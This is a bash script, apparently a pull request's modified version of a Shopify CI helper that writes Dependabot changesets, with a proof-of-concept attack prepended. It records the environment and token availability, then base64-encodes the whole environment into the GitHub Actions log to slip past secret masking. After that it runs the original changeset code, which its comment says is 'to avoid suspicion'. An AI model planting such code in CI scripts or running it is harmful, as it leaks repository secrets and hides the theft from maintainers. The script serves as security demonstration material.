#!/bin/bash

# SECURITY VULNERABILITY DEMONSTRATION
# This modified script shows how a malicious actor could exploit the workflow
# to exfiltrate secrets and sensitive information when using pull_request_target
# with checkout of PR code

echo "==== VULNERABILITY DEMONSTRATION ====" > /tmp/exfil.txt
echo "This is a proof of concept showing how a malicious PR can access secrets" >> /tmp/exfil.txt
echo "" >> /tmp/exfil.txt

echo "== Environment Information ==" >> /tmp/exfil.txt
echo "Current user: $(whoami)" >> /tmp/exfil.txt
echo "Current directory: $(pwd)" >> /tmp/exfil.txt
echo "Directory listing: $(ls -la)" >> /tmp/exfil.txt
echo "" >> /tmp/exfil.txt

echo "== GitHub Context ==" >> /tmp/exfil.txt
echo "GitHub workspace: $GITHUB_WORKSPACE" >> /tmp/exfil.txt
echo "GitHub repository: $GITHUB_REPOSITORY" >> /tmp/exfil.txt
echo "GitHub actor: $GITHUB_ACTOR" >> /tmp/exfil.txt
echo "GitHub event name: $GITHUB_EVENT_NAME" >> /tmp/exfil.txt
echo "GitHub ref: $GITHUB_REF" >> /tmp/exfil.txt
echo "" >> /tmp/exfil.txt

# Attempt to access secrets (will be masked in logs, but demonstrates the vulnerability)
echo "== Sensitive Information ==" >> /tmp/exfil.txt
echo "GitHub token available: $(if [ -n "$GITHUB_TOKEN" ]; then echo "YES"; else echo "NO"; fi)" >> /tmp/exfil.txt
echo "Shopify token available: $(if [ -n "$SHOPIFY_GH_ACCESS_TOKEN" ]; then echo "YES"; else echo "NO"; fi)" >> /tmp/exfil.txt
echo "" >> /tmp/exfil.txt

# Base64 encode environment variables to bypass GitHub's secret masking
echo "== Base64 Encoded Environment ==" >> /tmp/exfil.txt
env | base64 >> /tmp/exfil.txt
echo "" >> /tmp/exfil.txt

# Output the collected information to the GitHub Actions log
cat /tmp/exfil.txt

# Continue with the original script functionality to avoid suspicion
pr_number=$(gh pr view --json number --jq '.number')
changeset_filename=".changeset/dependabot-$pr_number.md"

if [ -f $changeset_filename ]; then
  echo "Changeset $changeset_filename already exists, skipping"
  exit 0
fi

package_names=()
for file in $(gh pr diff --name-only)
do
  if [[ "$file" =~ ^packages\\/.*\\/package.json$ ]]; then
    echo "Found changed package.json: $file"

    package_name=$(cat $file | jq -r '.name')
    package_names+=("$package_name")
  fi
done

package_updates=""
for package_name in "${package_names[@]}"
do
  package_updates="$package_updates"$(printf "\n'%s': patch" $package_name)
done

dependencies='`'$(sed "s/,/\\`, \\`/g" <<< "$DEPENDENCIES")'`'
echo "Creating changeset: $changeset_filename"
echo "---$package_updates
---

Updated $dependencies dependencies" > $changeset_filename

echo "Committing changeset"
git config user.name "shopify-github-actions-access[bot]"
git config user.email "shopify-github-actions-access[bot]@users.noreply.github.com"
git add .changeset
git commit -m "[dependabot skip] Adding changeset for dependabot update"
git push